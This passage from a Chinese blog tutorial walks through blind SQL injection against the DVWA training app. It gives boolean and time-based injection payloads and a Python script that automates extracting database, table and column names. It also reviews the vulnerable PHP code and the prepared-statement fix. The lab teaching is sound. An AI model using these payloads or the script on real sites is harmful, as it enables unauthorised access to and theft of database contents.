<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and substr(database(),1,1)=&#x27;</span>a<span class="string">&#x27;#   测试第一个字符是否为a</span></span><br><span class="line">1&#x27; and substr(database(),1,1)=&#x27;b&#x27;#   测试第一个字符是否为b</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;mysql中也有ascii()函数，可以返回字符的ascii码值，也可使用如下语句来测试：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))&gt;80#</span></span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;120#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))=100#</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;最后获取到当前连接数据库的名称为：dvwa。</p>
<p><strong>获取数据库表名</strong></p>
<p>&emsp;&emsp;通过信息数据库 information_schema 可以得到数据库中的表、字段等信息，具体如何获取请参考文章<a href="https://yiwenzhe.com/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89" target="_blank">DVWA(七)：SQL-Injection（sql注入）</a></p>
<p>&emsp;&emsp;代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">猜测表的个数</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;10 # </span></span><br><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&lt;5 # </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2 # </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜测表名长度</span></span><br><span class="line">1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))&gt;10 #</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜测第一个表名</span></span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 #</span><br><span class="line">猜测第二个表名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117 #</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;最后获取到表个数为2，表名分别为guestbook和users。</p>
<p><strong>获取表中字段名</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">猜测字段个数</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;)&gt;10 #</span></span><br><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=8 #</span><br><span class="line"></span><br><span class="line">猜测字段长度</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1))=7 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜测字段名称</span></span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=117 #</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;就算猜到了字段名称，字段具体值要一个个猜中还是很困难的，只能凭借用户习惯和运气来测试，这也是sql盲注的难点。sql盲注及其耗费时间，往往需要编写脚本来批量测试。这里给出一个python脚本如下（脚本来源<a href="https://blog.csdn.net/qq_42181428/article/details/88075784" target="_blank" rel="external nofollow noopener noreferrer">以dvwa为例学习简单sql布尔盲注的详细脚本</a>）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">#payload应该包括所有大小写字母和其他字符，这里是简化使用</span><br><span class="line">payloads = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#x27;</span> </span><br><span class="line">#此处提交需要用户登录的cookie，可以使用burpsuit抓取</span><br><span class="line">headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;security=low; PHPSESSID=1rgudn49lotqe6hedvv6uu7ioj&#x27;</span>&#125;</span><br><span class="line">#url为dvwa中sql盲注地址</span><br><span class="line">url=<span class="string">&quot;http://192.168.71.1/DVWA/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    databaseLen_payload = <span class="string">&#x27;?id=1\&#x27; and length(database())=&#x27;</span>+str(j)+<span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">    # 所有payload里的注释#要用url编码%23表示，因为这是直接添加在url里的</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+databaseLen_payload, headers=headers).text:</span><br><span class="line">        databaseLen = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&#x27;database_lenth: &#x27;</span>+str(databaseLen))</span><br><span class="line">databse_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,databaseLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payloads:</span><br><span class="line">        databse_payload = <span class="string">&#x27;?id=1\&#x27; and substr(database(),&#x27;</span>+str(j)+<span class="string">&#x27;,1)=\&#x27;&#x27;</span>+str(i)+<span class="string">&#x27;\&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+databse_payload, headers=headers).text:</span><br><span class="line">            databse_name += i</span><br><span class="line">print(<span class="string">&#x27;database_name: &#x27;</span>+databse_name)</span><br><span class="line">        </span><br><span class="line"># 3.爆破表的个数</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    tableNum_payload = <span class="string">&#x27;?id=1\&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=&#x27;</span>+str(j)+<span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+tableNum_payload, headers=headers).text:</span><br><span class="line">        tableNum = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&#x27;tableNum: &#x27;</span>+str(tableNum))</span><br><span class="line"></span><br><span class="line"># 4.爆出所有的表名</span><br><span class="line"># (1)爆出各个表名的长度</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,tableNum):</span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        tableLen_payload = <span class="string">&#x27;?id=1\&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit &#x27;</span>+str(j)+<span class="string">&#x27;,1),1))=&#x27;</span>+str(i)+<span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+tableLen_payload, headers=headers).text:</span><br><span class="line">            tableLen = i</span><br><span class="line">            print(<span class="string">&#x27;table&#x27;</span>+str(j+<span class="number">1</span>)+<span class="string">&#x27;_length: &#x27;</span>+str(tableLen))</span><br><span class="line">          </span><br><span class="line">            # (2)内部循环爆破每个表的表名</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,tableLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads:</span><br><span class="line">                    table_payload = <span class="string">&#x27;?id=1\&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit &#x27;</span>+str(j)+<span class="string">&#x27;,1),&#x27;</span>+str(m)+<span class="string">&#x27;,1)=\&#x27;&#x27;</span>+str(n)+<span class="string">&#x27;\&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+table_payload, headers=headers).text:</span><br><span class="line">                        table_name += n</span><br><span class="line">            print(<span class="string">&#x27;table&#x27;</span>+str(j+<span class="number">1</span>)+<span class="string">&#x27;_name: &#x27;</span>+table_name)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;结果如下：</p>
<div align="center"><img src="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/3.png" width="300" height="201"></div>

<p>&emsp;&emsp;以上例子都是基于布尔的盲注，也可以使用基于时间的盲注获取信息。输入：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(database())=4,sleep(5),1 )# </span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;当length正确时，网页会加载至少5秒；当length错误时，网页很快就返回。如下图，可以看到延迟时间为5.02秒。</p>
<div align="center"><img src="https://cdn.jsdelivr.net/gh/JdYwz/CDN/image/DVWA/SQL_Injection_Blind/4.png"></div>

<h1 id="安全级别Medium"><a href="#安全级别Medium" class="headerlink" title="安全级别Medium"></a>安全级别Medium</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    $id = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $id ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;中级代码中，使用POST获取传入参数，同时使用mysqli_real_escape_string来过滤一些特殊字符。所以当使用带引号的变量’dvwa’或者’users’时，可以使用16进制来代替。<br>&emsp;&emsp;中级的盲注过程和低级类似，其中中级需要POST方法提交，并注意一些字符的绕过，可参考上一篇文章<a href="https://yiwenzhe.com/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89" target="_blank">DVWA(七)：SQL-Injection（sql注入）</a>。</p>
<h1 id="安全级别High"><a href="#安全级别High" class="headerlink" title="安全级别High"></a>安全级别High</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount 随机延时</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;查询语句中使用Limit 1限制结果为一条，可以直接使用#注释该限制。同时在查询失败时，会使用sleep随机延时0-5秒，所以不能使用基于时间的盲注，可以使用基于布尔的盲注，和安全级别low过程类似。</p>
<h1 id="安全级别Impossible"><a href="#安全级别Impossible" class="headerlink" title="安全级别Impossible"></a>安全级别Impossible</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, <span class="attr">PDO</span>::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            echo <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">            header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            echo <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;Impossible代码中使用 Anti-CSRF token防止CSRF攻击，使用is_numeric( $id )判断输入的id是数字还是字符串，只有输入为数字才执行sql查询。</p>
<p>&emsp;&emsp;使用db-&gt;prepare和data-&gt;bindParam预处理sql语句，使得传入的变量被固定为数据，因此也就不会当做代码执行。最后验证sql语句查询结果数目$data-&gt;rowCount() == 1，只有为一条时才输出，有效防止爆库。</p>
            


            <!-- 添加的部分 -->
            <!-- copyright -->
            
                <div class="article-footer-copyright">
    <!--
    <p><span>本文标题:</span><href="/%20"> DVWA(八)：SQL-Injection（Blind盲注）</a></p>
    <p><span>文章作者:</span><a href="/" title="访问 YWZ的个人博客">YWZ</a></p>
    <p><span>发布时间:</span>2021年06月28日 - 21:29</p>
    <p><span>最后更新:</span>2021年10月09日 - 20:58</p>
    <p><span>原始链接:</span><a href="/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/" title="DVWA(八)：SQL-Injection（Blind盲注）">https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/</a>
    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/"  aria-label="复制成功！"></i></span>
    </p>
    <p><span>许可协议:</span><i class="fab fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
     -->
    <p>文章作者:<a href="/" title="访问 YWZ的个人博客">YWZ</a>
    <br>该文章是本人原创，转载请注明出处
    <br>本文链接地址: <a href="/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/" title="DVWA(八)：SQL-Injection（Blind盲注）">https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/</a></p>
</div>

            
            <!-- copyright -->
        </div>
    </div>
    <div id="post-footer" class="post-footer main-content-wrap">
        
            <div class="post-footer-tags">
                <span class="text-color-light text-small">标签</span><br>
                
    <a class="tag tag--primary tag--small t-none-link" href="/tags/DVWA/" rel="tag">DVWA</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/sql%E7%9B%B2%E6%B3%A8/" rel="tag">sql盲注</a>

            </div>
        
        
            <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                <a class="post-action-btn btn btn--default tooltip--top" href="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/" data-tooltip="DVWA(四)：File-Inclusion（文件包含）" aria-label="上一篇: DVWA(四)：File-Inclusion（文件包含）">
                    
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a class="post-action-btn btn btn--default tooltip--top" href="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/" data-tooltip="DVWA(七)：SQL-Injection（sql注入）" aria-label="下一篇: DVWA(七)：SQL-Injection（sql注入）">
                    
                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/&amp;title=DVWA(八)：SQL-Injection（Blind盲注）" title="分享到 QQ" aria-label="分享到 QQ" rel="external nofollow noopener noreferrer">
                    <i class="fab fa-qq" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="_blank" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/" title="分享到 Qzone" aria-label="分享到 Qzone" rel="external nofollow noopener noreferrer">
                    <i class="fa fa-star" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="_blank" href="http://service.weibo.com/share/share.php?&amp;title=https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/" title="分享到 Weibo" aria-label="分享到 Weibo" rel="external nofollow noopener noreferrer">
                    <i class="fab fa-weibo" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


        
        
            
                <style>
    .valine-card {
        margin: 1.5rem auto;
    }
    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }
</style>
<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',  
        appId: 'zigmtQSTyuJK9u3TgCdBu7lE-MdYXbMMI',
        appKey: 'As1hAM6sIKBtmAPYIM0OOrQN', 
        placeholder: 'ヾﾉ≧∀≦)o欢迎发表意见!' ,
        notify: 'false',
        verity: '',
        path: window.location.pathname,
        avatar: 'robohash',
        meta: ['nick','mail','link'],
        pageSize: '10',
        lang: 'zh-cn',
        visitor: 'false',
        highlight: '',
        serverURLs: 'https://zigmtqst.api.lncldglobal.com'
    });
</script>
<span id="/2021/06/28/DVWA-八-：SQL-Injection（Blind盲注）/" class="leancloud_visitors" data-flag-title="Your Article Title">
    <em class="post-meta-item-text">阅读量 </em>
    <i class="leancloud-visitors-count">1000000</i>
</span>  
            
        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2022 <a href="https://yiwenzhe.com">YWZ</a>. All Rights Reserved.
    </span>
    <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
<script>
    var now = new Date(); 
    function createtime() { 
        var grt= new Date("10/11/2020 14:56:39");//在此处修改你的建站时间，格式：月/日/年 时:分:秒
        now.setTime(now.getTime()+250); 
